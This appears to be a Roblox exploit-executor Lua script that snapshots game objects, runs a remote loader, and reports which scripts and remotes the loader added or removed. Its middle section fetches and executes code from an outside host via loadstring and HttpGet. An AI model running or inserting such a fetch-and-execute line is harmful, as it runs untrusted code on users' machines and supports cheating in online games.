-- Slow, non-laggy scanner – processes hierarchy gradually with yields
-- LocalScript – run via executor

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local interestingClasses = {
    "Script", "LocalScript", "ModuleScript",
    "RemoteEvent", "RemoteFunction",
    "BindableEvent", "BindableFunction",
    "TouchTransmitter", "TouchInterest",
    "ClickDetector", "ProximityPrompt"
}

-- Containers we care about (add/remove as needed – fewer = faster)
local rootContainers = {
    game:GetService("ReplicatedStorage"),
    game:GetService("Workspace"),
    game:GetService("CoreGui"),
    LocalPlayer:WaitForChild("PlayerGui", 10),
    LocalPlayer:WaitForChild("PlayerScripts", 10),
    -- game:GetService("StarterGui"), etc. – avoid if too heavy
}

-- How many objects to process before yielding (higher = faster but more lag spikes)
local BATCH_SIZE = 150     -- tune: 50–300; smaller = smoother but slower overall

local function slowCollectInteresting(root, collectorTable, progressCallback)
    local queue = {root}
    local processed = 0

    while #queue > 0 do
        local current = table.remove(queue, 1)  -- FIFO (breadth-first)

        -- Check current
        if table.find(interestingClasses, current.ClassName) then
            local parentPath = current.Parent and current.Parent:GetFullName() or "?"
            local key = string.format("%s | %s | Parent: %s",
                current.ClassName,
                current.Name,
                parentPath
            )
            collectorTable[key] = (collectorTable[key] or 0) + 1
        end

        -- Queue children
        for _, child in ipairs(current:GetChildren()) do
            table.insert(queue, child)
        end

        processed = processed + 1
        if processed % BATCH_SIZE == 0 then
            -- Yield to let Roblox breathe (adjust time: 0.01–0.08)
            task.wait(0.03)
            if progressCallback then
                progressCallback(processed)
            end
        end
    end
end

local function getSlowSnapshot()
    local snap = { objects = {} }
    local totalProcessed = 0

    print("[SLOW SCAN] Starting – this will take a while but should not freeze...")

    for _, root in ipairs(rootContainers) do
        if not root then continue end

        print("[SLOW SCAN] Scanning: " .. root:GetFullName())

        slowCollectInteresting(root, snap.objects, function(count)
            totalProcessed = totalProcessed + count
            if totalProcessed % 2000 == 0 then
                print("   ... processed ~" .. totalProcessed .. " objects so far")
            end
        end)
    end

    print("[SLOW SCAN] Finished – total processed ≈ " .. totalProcessed)
    return snap
end

-- ────────────────────────────────────────────
print("Creating BEFORE snapshot (slow mode)...")
local before = getSlowSnapshot()

print("[EXEC] Running loadstring...")
local success, err = pcall(function()
    loadstring(game:HttpGet("https://init.frostbyte.lol", true))()
end)
if not success then
    warn("[EXEC ERROR] " .. tostring(err))
end

print("[WAIT] Giving payload ~20 seconds to do stuff...")
task.wait(20)

print("Creating AFTER snapshot (slow mode again)...")
local after = getSlowSnapshot()

-- ────────────────────────────────────────────
-- Simple diff & report
local report = {}
table.insert(report, "Slow Anticheat-Relevant Diff Report")
table.insert(report, os.date("%Y-%m-%d %H:%M:%S"))
table.insert(report, "──────────────────────────────────")
table.insert(report, "")

local changesFound = false

table.insert(report, "CHANGES (new / removed interesting objects):")
local allKeys = {}
for k in pairs(before.objects) do allKeys[k] = true end
for k in pairs(after.objects) do allKeys[k] = true end

for key in pairs(allKeys) do
    local b = before.objects[key] or 0
    local a = after.objects[key] or 0
    if a > b then
        table.insert(report, string.format("   + %s  (was %d → now %d)", key, b, a))
        changesFound = true
    elseif a < b then
        table.insert(report, string.format("   − %s  (was %d → now %d)", key, b, a))
        changesFound = true
    end
end

if not changesFound then
    table.insert(report, "   (No changes detected in scanned classes/locations)")
end

table.insert(report, "")
table.insert(report, "Notes:")
table.insert(report, "• Scan is VERY slow on purpose to avoid freezing/crashes")
table.insert(report, "• Only shallow-ish interesting classes checked")
table.insert(report, "• Many modern exploits don't create new visible Instances → expect empty diff")
table.insert(report, "• Tune BATCH_SIZE or task.wait time if still issues")

-- Save report
local filename = "SlowAnticheatDiff.txt"
local ok = pcall(writefile, filename, table.concat(report, "\n"))

if ok then
    print("[SAVED] Report saved to: " .. filename .. " (check files tab)")
else
    warn("[SAVE ERROR] – dumping to console:")
    for _, line in ipairs(report) do print(line) end
end

print("All done.")
